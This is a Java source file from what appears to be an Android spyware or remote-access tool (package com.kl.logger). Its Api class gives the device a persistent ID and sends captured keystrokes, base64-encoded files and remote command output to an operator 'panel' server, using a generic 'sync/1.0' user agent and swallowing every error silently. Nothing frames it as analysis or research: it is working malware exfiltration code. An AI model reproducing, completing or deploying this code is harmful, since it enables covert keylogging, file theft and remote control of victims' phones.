package com.kl.logger;

import android.content.Context;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public final class Api {
    private Api() {}

    static String id(Context c) {
        String v = Prefs.token(c);
        if (v == null || v.isEmpty()) {
            v = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            Prefs.setToken(c, v);
        }
        return v;
    }

    /**
     * Faz uma chamada HTTP síncrona. Deve ser chamado em background thread.
     * @param path  rota relativa, ex: "/api/reg"
     * @param body  JSONObject para POST, null para GET
     * @param method "POST" ou "GET"
     */
    static String call(String path, JSONObject body, String method) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(BuildConfig.PANEL_URL + path);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod(method);
            conn.setConnectTimeout(15_000);
            conn.setReadTimeout(20_000);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "sync/1.0");
            conn.setRequestProperty("Accept", "application/json");

            if (body != null) {
                conn.setDoOutput(true);
                byte[] data = body.toString().getBytes(StandardCharsets.UTF_8);
                conn.setFixedLengthStreamingMode(data.length);
                try (OutputStream out = conn.getOutputStream()) {
                    out.write(data);
                }
            }

            int code = conn.getResponseCode();
            InputStream stream = (code >= 400) ? conn.getErrorStream() : conn.getInputStream();
            if (stream == null) return null;

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            byte[] tmp = new byte[8192];
            int n;
            while ((n = stream.read(tmp)) > 0) buf.write(tmp, 0, n);
            return buf.toString("UTF-8");

        } catch (Exception e) {
            return null;
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /** POST assíncrono — dispara e esquece. */
    static void post(String path, JSONObject body) {
        new Thread(() -> call(path, body, "POST")).start();
    }

    /** Envia chunk de keylog ao painel. */
    static void keylog(Context c, String text) {
        new Thread(() -> {
            try {
                JSONObject o = new JSONObject();
                o.put("id", id(c));
                o.put("text", text);
                call("/api/keylog", o, "POST");
            } catch (Exception ignored) {}
        }).start();
    }

    /** Envia arquivo como base64 ao painel. */
    static void file(Context c, String name, String mime, byte[] data) {
        new Thread(() -> {
            try {
                String b64 = android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
                JSONObject o = new JSONObject();
                o.put("id", id(c));
                o.put("name", name);
                o.put("mime", mime);
                o.put("b64", b64);
                call("/api/file", o, "POST");
            } catch (Exception ignored) {}
        }).start();
    }

    /** Envia resultado de comando ao painel. */
    static void res(Context c, String cmd, String out) {
        post("/api/res", safeJson(c, cmd, out));
    }

    private static JSONObject safeJson(Context c, String cmd, String out) {
        try {
            JSONObject o = new JSONObject();
            o.put("id", id(c));
            o.put("cmd", cmd);
            o.put("out", out != null ? out.substring(0, Math.min(out.length(), 200_000)) : "null");
            return o;
        } catch (Exception e) { return new JSONObject(); }
    }
}
